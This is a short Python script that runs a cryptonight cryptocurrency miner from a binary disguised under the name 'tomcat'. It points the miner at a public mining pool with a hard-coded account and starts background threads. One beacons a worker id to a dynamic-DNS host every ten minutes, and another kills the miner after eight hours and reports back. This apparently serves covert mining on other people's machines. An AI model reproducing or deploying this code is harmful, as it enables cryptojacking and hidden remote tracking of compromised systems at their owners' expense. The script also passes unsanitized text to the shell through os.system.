import os, requests, datetime, threading
from time import sleep


def os_print(text):
    os.system('echo {text}'.format(text=text))


def send_signal(is_beacon=False):
    with open('id', 'r') as f:
        worker_name = f.read()
    if is_beacon:
        url = 'http://anthill.duckdns.org:1786/cms/beacon/'
    else:
        url = 'http://anthill.duckdns.org:1786/cms/'
    try:
        requests.post(url, {'worker': worker_name})
    except:
        pass


class WatchDog():
    def __init__(self, interval):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.start()

    def run(self):
        sleep(self.interval)
        os_print('WatchDog - {dt}'.format(dt=datetime.datetime.now()))
        os.system('killall tomcat')
        send_signal(is_beacon=False)


class Beacon():
    def __init__(self, interval):
        self.interval = interval
        thread = threading.Thread(target=self.run, args=())
        thread.start()

    def run(self):
        for i in range(0, 47):
            os_print('{dt}'.format(dt=datetime.datetime.now()))
            send_signal(is_beacon=True)
            sleep(self.interval)


def main():
    Beacon(60*10)  # 10 min
    WatchDog(60*60*8)  #8 h
    os.system('./tomcat -a cryptonight -o stratum+tcp://bcn.pool.minergate.com:45550 -u khu12@asia.com -p x -t 1')
    os_print('FINISH!!!')


if __name__ == '__main__':
    main() 

#2017-11-14 12:12:14.071782